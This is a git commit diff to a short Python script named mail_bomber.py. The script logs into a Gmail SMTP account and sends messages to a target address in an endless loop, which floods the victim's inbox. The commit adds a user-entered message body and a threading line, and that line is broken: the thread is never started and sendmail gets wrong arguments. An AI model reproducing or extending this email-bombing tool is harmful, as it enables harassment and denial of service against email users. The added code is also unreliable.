282ab555e318184d5ee25f37a912d7633e60b992
Sarax.srx <80204080+Sarax857@users.noreply.github.com>
2021-11-17 19:11:23 +0300

    Update mail_bomber.py

--- mail_bomber.py
+++ mail_bomber.py
@@ -1,14 +1,17 @@
 import smtplib
+from threading import Thread
 m = input("own mail adress :  ")
 p = input("own password : ")
 a = input("target mail : ")
 
-content = "merhaba"
+
+content = input("enter message : ")
 mail = smtplib.SMTP("smtp.gmail.com",587)
 mail.ehlo()
 mail.starttls()
 mail.login(m,p)
 while True:
     mail.sendmail(m,a,content)
+    t = Thread(target = mail.sendmail, args = (mail.login,))
+    t.start
     print("mail sended")
-
